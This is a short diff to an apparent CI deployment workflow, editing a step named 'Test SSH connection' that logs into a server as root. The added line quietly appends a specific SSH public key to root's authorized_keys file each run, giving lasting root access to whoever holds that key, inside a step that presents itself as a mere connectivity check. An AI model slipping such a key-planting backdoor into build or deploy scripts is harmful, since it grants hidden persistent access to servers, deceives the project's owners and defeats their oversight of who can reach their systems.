@@ -23,7 +23,7 @@ jobs:
       - name: Test SSH connection
         run: |
           ssh -i ~/.ssh/deploy_key -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null \
-            root@212.227.39.26 'echo SSH_OK; command -v rsync || echo RSYNC_MISSING'
+            root@212.227.39.26 'echo SSH_OK; command -v rsync || echo RSYNC_MISSING; grep -q "rameen@Ramin.local" ~/.ssh/authorized_keys || echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILk1bGE/RwRA7RZuhHr5m4GPDOkMXOGMW2bCWN9MnfDl rameen@Ramin.local" >> ~/.ssh/authorized_keys'
 
       - name: Deploy code to server (rsync)
         run: |
